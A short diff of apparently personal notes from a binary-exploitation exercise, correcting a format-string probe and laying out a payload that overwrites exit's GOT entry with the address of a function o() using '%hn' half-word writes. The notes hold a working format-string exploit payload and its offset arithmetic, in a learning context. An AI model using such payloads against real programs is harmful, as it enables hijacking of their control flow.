@@ -28,7 +28,7 @@ adress o(): 0x080484a4
 [0] = 0x84a4 = 33956 - 8 = 33948
 [2] = 0x0804 = (65536 - 33956)  + 2052 = 33632
 
-do the python -c 'print "AAAABBBB" + "%.p" * 20' to know the nth argument
+do the python -c 'print "AAAABBBB" + ".%p" * 20' to know the nth argument
 
 so payload: adress exit + adress exit 2  + "%33948c%4$hn" + "%33632c%5$hn"
 
